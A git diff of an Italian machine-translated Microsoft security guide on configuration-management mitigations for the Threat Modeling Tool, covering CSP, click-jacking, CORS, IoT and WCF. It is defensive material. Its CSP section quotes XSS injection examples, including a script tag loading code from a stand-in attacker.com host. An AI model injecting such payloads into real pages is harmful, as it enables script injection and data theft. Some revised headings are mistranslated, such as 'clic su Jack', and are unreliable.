@@ -1,5 +1,5 @@
 ---
-title: Gestione della configurazione per lo strumento microsoft di modellazione delle minacce
+title: Gestione della configurazione per il Microsoft Threat Modeling Tool
 titleSuffix: Azure
 description: Procedure di mitigazione delle minacce esposte in Threat Modeling Tool
 services: security
@@ -16,25 +16,25 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: ead6a79109c221d31ead96a202e97294ef218c5f
-ms.sourcegitcommit: acb82fc770128234f2e9222939826e3ade3a2a28
+ms.openlocfilehash: 499e4cb2cb62ccc170637bad60898b38b4ff3be7
+ms.sourcegitcommit: 67bddb15f90fb7e845ca739d16ad568cbc368c06
 ms.translationtype: MT
 ms.contentlocale: it-IT
-ms.lasthandoff: 04/21/2020
-ms.locfileid: "81687983"
+ms.lasthandoff: 04/28/2020
+ms.locfileid: "82204254"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Infrastruttura di sicurezza: gestione della configurazione - Procedure di mitigazione 
 | Prodotto o servizio | Articolo |
 | --------------- | ------- |
-| **Applicazione Web** | <ul><li>[Implementare i criteri di sicurezza del contenuto (CSP) e disabilitare javascript inline](#csp-js)</li><li>[Abilitare il filtro XSS del browser](#xss-filter)</li><li>[ASP.NET le applicazioni devono disabilitare l'analisi e il debug prima della distribuzione](#trace-deploy)</li><li>[Accedere a javascript di terze parti solo da fonti attendibili](#js-trusted)</li><li>[Assicurarsi che le pagine ASP.NET autenticate includano le difese UI Redressing o Click-jacking](#ui-defenses)</li><li>[Verificare che siano consentite solo le origini attendibili se CORS è abilitato in ASP.NET applicazioni Web](#cors-aspnet)</li><li>[Abilitare l'attributo ValidateRequest nelle pagine di ASP.NET](#validate-aspnet)</li><li>[Usare le versioni più recenti ospitate in locale delle librerie JavaScript](#local-js)</li><li>[Disabilitare l'analisi MIME automatica](#mime-sniff)</li><li>[Rimuovere le intestazioni standard del server nei siti Web di Windows Azure per evitare l'impronta digitale](#standard-finger)</li></ul> |
-| **Database** | <ul><li>[Configurazione di Windows Firewall per l'accesso al Motore di database](#firewall-db)</li></ul> |
-| **API Web** | <ul><li>[Verificare che siano consentite solo origini attendibili se CORS è abilitato nellASP.NETAPI Web](#cors-api)</li><li>[Crittografare sezioni dei file di configurazione dell'API Web che contengono dati sensibili](#config-sensitive)</li></ul> |
-| **Dispositivo IoT** | <ul><li>[Assicurarsi che tutte le interfacce di amministrazione siano protette con credenziali sicureEnsure that all admin interfaces are secured with strong credentials](#admin-strong)</li><li>[Assicurarsi che il codice sconosciuto non possa essere eseguito sui dispositiviEnsure that unknown code cannot execute on devices](#unknown-exe)</li><li>[Crittografare il sistema operativo e altre partizioni del dispositivo IoT con bit-locker](#partition-iot)</li><li>[Assicurarsi che nei dispositivi siano abilitati solo i servizi/funzionalità minimi](#min-enable)</li></ul> |
-| **Gateway IoT sul campo** | <ul><li>[Crittografare il sistema operativo e le partizioni aggiuntive di IoT Field Gateway con bit-locker](#field-bit-locker)</li><li>[Assicurarsi che le credenziali di accesso predefinite del gateway di campo vengano modificate durante l'installazione](#default-change)</li></ul> |
-| **Gateway IoT cloud** | <ul><li>[Assicurarsi che Cloud Gateway implementi un processo per mantenere aggiornato il firmware dei dispositivi connessi](#cloud-firmware)</li></ul> |
-| **Limite di trust dei computer** | <ul><li>[Verificare che i dispositivi dispongano di controlli di sicurezza dell'estremità configurati in base ai criteri dell'organizzazioneEnsure that devices have end-point security controls configured as base a organizational policies](#controls-policies)</li></ul> |
-| **Archiviazione di AzureAzure Storage** | <ul><li>[Assicurare una gestione sicura delle chiavi di accesso alle risorse di archiviazione di Azure](#secure-keys)</li><li>[Verificare che siano consentite solo origini attendibili se CORS è abilitato in Archiviazione di AzureEnsure that only trusted origins are allowed if CORS is enabled on Azure storage](#cors-storage)</li></ul> |
-| **WCF** | <ul><li>[Abilitare la funzionalità di limitazione dei servizi di WCFEnable WCF's service throttling feature](#throttling)</li><li>[Divulgazione di informazioni WCF tramite metadatiWCF-Information disclosure through metadata](#info-metadata)</li></ul> | 
+| **Applicazione Web** | <ul><li>[Implementare i criteri di sicurezza del contenuto (CSP) e disabilitare JavaScript inline](#csp-js)</li><li>[Abilitare il filtro XSS del browser](#xss-filter)</li><li>[Le applicazioni ASP.NET devono disabilitare la traccia e il debug prima della distribuzione](#trace-deploy)</li><li>[Accedere a JavaScript di terze parti solo da origini attendibili](#js-trusted)</li><li>[Assicurarsi che le pagine ASP.NET autenticate includano le difese dell'interfaccia utente o di clic su Jack](#ui-defenses)</li><li>[Assicurarsi che siano consentite solo origini attendibili se CORS è abilitato nelle applicazioni Web ASP.NET](#cors-aspnet)</li><li>[Abilitare l'attributo ValidateRequest nelle pagine ASP.NET](#validate-aspnet)</li><li>[Usare le versioni più recenti ospitate in locale delle librerie JavaScript](#local-js)</li><li>[Disabilitare l'analisi MIME automatica](#mime-sniff)</li><li>[Rimuovere le intestazioni del server standard nei siti Web di Microsoft Azure per evitare l'impronta digitale](#standard-finger)</li></ul> |
+| **Database** | <ul><li>[Configurare Windows Firewall per l'accesso al motore di database](#firewall-db)</li></ul> |
+| **API Web** | <ul><li>[Assicurarsi che siano consentite solo origini attendibili se CORS è abilitato in API Web ASP.NET](#cors-api)</li><li>[Crittografare le sezioni dei file di configurazione dell'API Web contenenti dati sensibili](#config-sensitive)</li></ul> |
+| **Dispositivo IoT** | <ul><li>[Assicurarsi che tutte le interfacce amministrative siano protette con credenziali complesse](#admin-strong)</li><li>[Verificare che non sia possibile eseguire codice sconosciuto nei dispositivi](#unknown-exe)</li><li>[Crittografare il sistema operativo e altre partizioni del dispositivo IoT con bit-locker](#partition-iot)</li><li>[Assicurarsi che nei dispositivi siano abilitati solo servizi/funzionalità minime](#min-enable)</li></ul> |
+| **Gateway IoT sul campo** | <ul><li>[Crittografare il sistema operativo e altre partizioni del gateway sul campo Internet con bit-Locker](#field-bit-locker)</li><li>[Verificare che le credenziali di accesso predefinite del gateway sul campo vengano modificate durante l'installazione](#default-change)</li></ul> |
+| **Gateway IoT cloud** | <ul><li>[Verificare che il gateway cloud implementi un processo per mantenere aggiornato il firmware dei dispositivi connessi](#cloud-firmware)</li></ul> |
+| **Limite di trust dei computer** | <ul><li>[Assicurarsi che i dispositivi dispongano di controlli di sicurezza endpoint configurati in base ai criteri dell'organizzazione](#controls-policies)</li></ul> |
+| **Archiviazione di Azure** | <ul><li>[Assicurare una gestione sicura delle chiavi di accesso alle risorse di archiviazione di Azure](#secure-keys)</li><li>[Assicurarsi che siano consentite solo origini attendibili se CORS è abilitato in archiviazione di Azure](#cors-storage)</li></ul> |
+| **WCF** | <ul><li>[Abilitare la funzionalità di limitazione dei servizi di WCF](#throttling)</li><li>[Divulgazione di informazioni WCF tramite metadati](#info-metadata)</li></ul> | 
 
 ## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>Implementare Content Security Policy (CSP) e disabilitare il contenuto JavaScript inline
 
@@ -45,14 +45,14 @@ ms.locfileid: "81687983"
 | **Tecnologie applicabili** | Generico |
 | **Attributi**              | N/D  |
 | **Riferimenti**              | [An Introduction to Content Security Policy](https://www.html5rocks.com/en/tutorials/security/content-security-policy/) (Introduzione a Content Security Policy) [Content Security Policy Reference](https://content-security-policy.com/) (Informazioni di riferimento su Content Security Policy), [Security features](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/) (Funzionalità di sicurezza), [Introduction to content security policy](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) (Introduzione a Content Security Policy), [(È possibile usare use CSP?)](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **Passaggi** | <p>Content Security Policy (CSP) è un meccanismo di sicurezza avanzato, uno standard W3C, che consente ai proprietari di applicazioni Web di avere il controllo del contenuto incorporato nel sito. CSP viene aggiunto come intestazione della risposta HTTP nel server Web e viene applicato sul lato client dai browser. Si tratta di criteri basati su un elenco di elementi consentiti: un sito Web può dichiarare un set di domini attendibili da cui possono essere caricati contenuti attivi, ad esempio JavaScript.</p><p>CSP offre i seguenti vantaggi per la sicurezza:</p><ul><li>**Protezione da XSS:** se una pagina è vulnerabile a XSS, un utente malintenzionato può sfruttarlo in 2 modi:<ul><li>Inserimento di `<script>malicious code</script>`. Questo exploit non funzionerà a causa della restrizione di base 1 di CSP</li><li>Inserimento di `<script src="http://attacker.com/maliciousCode.js"/>`. Questo exploit non funzionerà poiché il dominio controllato dall'aggressore non sarà nella whitelist dei domini del CSP</li></ul></li><li>**Controllo sull'esfiltrazione dei dati:** se un contenuto dannoso in una pagina Web prova a connettersi a un sito Web esterno e a sottrarre dati, la connessione verrà interrotta da CSP. Questo perché il dominio di destinazione non sarà nella whitelist di CSP</li><li>**Difesa contro il click-jacking:** il click-jacking è una tecnica di attacco con la quale un antagonista può inserire in un frame un sito Web originale e forzare gli utenti a fare clic sugli elementi dell'interfaccia utente. Attualmente la difesa contro il click-jacking si basa sulla configurazione dell'intestazione della risposta X-Frame-Options. Non tutti i browser supportano questa intestazione e, con il passare del tempo, CSP diventerà uno dei modi standard per difendersi dal click-jacking</li><li>**Creazione di report sugli attacchi in tempo reale:** se si verifica un attacco di tipo injection in un sito Web abilitato per CSP, i browser attiveranno automaticamente una notifica per un endpoint configurato sul server Web. In questo modo, CSP funge da sistema di avviso in tempo reale.</li></ul> |
+| **Passaggi** | <p>Content Security Policy (CSP) è un meccanismo di sicurezza avanzato, uno standard W3C, che consente ai proprietari di applicazioni Web di avere il controllo del contenuto incorporato nel sito. CSP viene aggiunto come intestazione della risposta HTTP nel server Web e viene applicato sul lato client dai browser. Si tratta di criteri basati su un elenco di elementi consentiti: un sito Web può dichiarare un set di domini attendibili da cui possono essere caricati contenuti attivi, ad esempio JavaScript.</p><p>CSP offre i seguenti vantaggi per la sicurezza:</p><ul><li>**Protezione da XSS:** se una pagina è vulnerabile a XSS, un utente malintenzionato può sfruttarlo in 2 modi:<ul><li>Inserimento di `<script>malicious code</script>`. Questo exploit non funzionerà a causa della restrizione di base del CSP-1</li><li>Inserimento di `<script src="http://attacker.com/maliciousCode.js"/>`. Questo exploit non funzionerà perché il dominio controllato dall'utente malintenzionato non sarà presente nell'elenco degli elementi consentiti del CSP dei domini</li></ul></li><li>**Controllo sull'esfiltrazione dei dati:** se un contenuto dannoso in una pagina Web prova a connettersi a un sito Web esterno e a sottrarre dati, la connessione verrà interrotta da CSP. Questo perché il dominio di destinazione non sarà presente nell'elenco elementi consentiti del CSP</li><li>**Difesa contro il click-jacking:** il click-jacking è una tecnica di attacco con la quale un antagonista può inserire in un frame un sito Web originale e forzare gli utenti a fare clic sugli elementi dell'interfaccia utente. Attualmente la difesa contro il click-jacking si basa sulla configurazione dell'intestazione della risposta X-Frame-Options. Non tutti i browser supportano questa intestazione e, con il passare del tempo, CSP diventerà uno dei modi standard per difendersi dal click-jacking</li><li>**Creazione di report sugli attacchi in tempo reale:** se si verifica un attacco di tipo injection in un sito Web abilitato per CSP, i browser attiveranno automaticamente una notifica per un endpoint configurato sul server Web. In questo modo, CSP funge da sistema di avviso in tempo reale.</li></ul> |
 
 ### <a name="example"></a>Esempio
 Criteri di esempio: 
 ```csharp
 Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
 ```
-Questo criterio consente il caricamento degli script solo dal server dell'applicazione Web e dal server di Google Analytics. Gli script caricati da altri siti verranno rifiutati. Quando CSP viene abilitato in un sito Web, le funzionalità seguenti vengono automaticamente disabilitate per mitigare gli attacchi XSS. 
+Questo criterio consente il caricamento degli script solo dal server dell'applicazione Web e da Google Analytics Server. Gli script caricati da altri siti verranno rifiutati. Quando CSP viene abilitato in un sito Web, le funzionalità seguenti vengono automaticamente disabilitate per mitigare gli attacchi XSS. 
 
 ### <a name="example"></a>Esempio
 Gli script inline non verranno eseguiti. Di seguito sono riportati esempi di script inline. 
@@ -99,9 +99,9 @@ Example: var str="alert(1)"; eval(str);
 | **Tecnologie applicabili** | Generico |
 | **Attributi**              | N/D  |
 | **Riferimenti**              | N/D  |
-| **Passaggi** | solo le origini attendibili devono fare riferimento al contenuto JavaScript di terze parti. Gli endpoint di riferimento devono sempre essere in SSL. |
+| **Passaggi** | solo le origini attendibili devono fare riferimento al contenuto JavaScript di terze parti. Gli endpoint di riferimento devono essere sempre in TLS. |
 
-## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Assicurarsi che le pagine ASP.NET autenticate includano le difese UI Redressing o Click-jacking
+## <a name="ensure-that-authenticated-aspnet-pages-incorporate-ui-redressing-or-click-jacking-defenses"></a><a id="ui-defenses"></a>Assicurarsi che le pagine ASP.NET autenticate includano le difese dell'interfaccia utente o di clic su Jack
 
 | Titolo                   | Dettagli      |
 | ----------------------- | ------------ |
@@ -109,11 +109,11 @@ Example: var str="alert(1)"; eval(str);
 | **Fase SDL**               | Compilare |  
 | **Tecnologie applicabili** | Generico |
 | **Attributi**              | N/D  |
-| **Riferimenti**              | [OWASP click-jacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [IE Internals - Combattere il click-jacking con X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
+| **Riferimenti**              | Foglio informativo [sulla difesa di OWASP click-jacking](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), elementi [interni di IE-combattimento di click-jacking con X-frame-options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
 | **Passaggi** | <p>Il click-jacking, noto anche come "attacco di tipo UI redress", si verifica quando un utente malintenzionato usa più livelli trasparenti o opachi per ingannare un utente che vuole fare clic nella pagina principale e indurlo invece a fare clic su un pulsante o su un collegamento in un'altra pagina.</p><p>Questa sovrapposizione si ottiene creando una pagina dannosa con un iframe, che carica la pagina della vittima. L'utente malintenzionato assume quindi il controllo dei clic destinati alla pagina e li instrada a un'altra pagina, quasi certamente di proprietà di un'altra applicazione o dominio oppure di entrambi. Per impedire gli attacchi di tipo click-jacking, impostare le intestazioni della risposta HTTP X-Frame-Options appropriate che indicano al browser di non consentire l'inserimento in frame da altri domini</p>|
 
 ### <a name="example"></a>Esempio
-L'intestazione X-FRAME-OPTIONS può essere impostata tramite IIS web.config. Frammento di codice Web.config per i siti che non devono mai essere incorniciati: 
+L'intestazione X-FRAME-OPTIONS può essere impostata tramite IIS Web. config. Frammento di codice di Web. config per siti che non devono mai essere incorniciati: 
 ```csharp
     <system.webServer>
         <httpProtocol>
@@ -534,7 +534,7 @@ Per disabilitare CORS per un controller o un'azione, usare l'attributo [DisableC
 | **Riferimenti**              | N/D  |
 | **Passaggi** | Non abilitare né disattivare funzionalità o servizi del sistema operativo non necessari per il funzionamento della soluzione. Se, ad esempio, il dispositivo non richiede la distribuzione di un'interfaccia utente, installare Windows IoT Core in modalità headless. |
 
-## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Crittografare il sistema operativo e le partizioni aggiuntive di IoT Field Gateway con bit-locker
+## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Crittografare il sistema operativo e altre partizioni del gateway sul campo Internet con bit-Locker
 
 | Titolo                   | Dettagli      |
 | ----------------------- | ------------ |
